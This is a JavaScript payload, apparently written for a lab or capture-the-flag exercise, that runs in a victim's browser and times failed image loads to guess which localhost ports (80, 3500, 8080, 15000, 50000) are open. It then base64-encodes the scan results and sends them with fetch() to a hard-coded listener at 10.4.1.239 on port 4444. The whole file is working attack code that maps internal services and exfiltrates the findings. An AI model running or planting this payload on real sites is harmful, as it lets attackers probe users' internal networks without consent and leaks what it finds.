var portIsOpen = function(hostToScan, portToScan, N) {
  return new Promise((resolve, reject) => {
    var portIsOpen = 'unknown';

    var timePortImage = function(port) {
      return new Promise((resolve, reject) => {
        var t0 = performance.now()
        // a random appendix to the URL to prevent caching
        var random = Math.random().toString().replace('0.', '').slice(0, 7)
        var img = new Image;

        img.onerror = function() {
          var elapsed = (performance.now() - t0)
          // close the socket before we return
          resolve(parseFloat(elapsed.toFixed(3)))
        }

        img.src = 'http://' + hostToScan + ':' + port + '/' + random + '.png'
      })
    }

    const portClosed = 37857; // let's hope it's closed :D

    (async () => {
      var timingsOpen = [];
      var timingsClosed = [];
      for (var i = 0; i < N; i++) {
        timingsOpen.push(await timePortImage(portToScan))
        timingsClosed.push(await timePortImage(portClosed))
      }

      var sum = (arr) => arr.reduce((a, b) => a + b);
      var sumOpen = sum(timingsOpen);
      var sumClosed = sum(timingsClosed);
      var test1 = sumOpen >= (sumClosed * 1.3);
      var test2 = false;

      var m = 0;
      for (var i = 0; i <= N; i++) {
        if (timingsOpen[i] > timingsClosed[i]) {
          m++;
        }
      }
      // 80% of timings of open port must be larger than closed ports
      test2 = (m >= Math.floor(0.8 * N));
      portIsOpen = test1 && test2;
      resolve(`Port ${portToScan}: ${portIsOpen ? 'open' : 'closed'}`);
    })();
  });
}

const LHOST = '10.4.1.239';
const PORT = '4444';
const portscan = async () => {
    //let ports = [21, 22, 80, 443];
    let ports = [80, 3500, 8080, 15000, 50000];
    const promises = ports.map(p => (portIsOpen('localhost', p, 30)));
    const result = (await Promise.all(promises)).join('\n')
    fetch(`http://${LHOST}:${PORT}?key=` + btoa(result));
    return result;
}

portscan()
    .then((res) => {
        console.log('Portscan is completed.');
	console.log(res);
    })
    .catch((err) => {
	console.log('Error occurred.');
	console.log(err)
    })
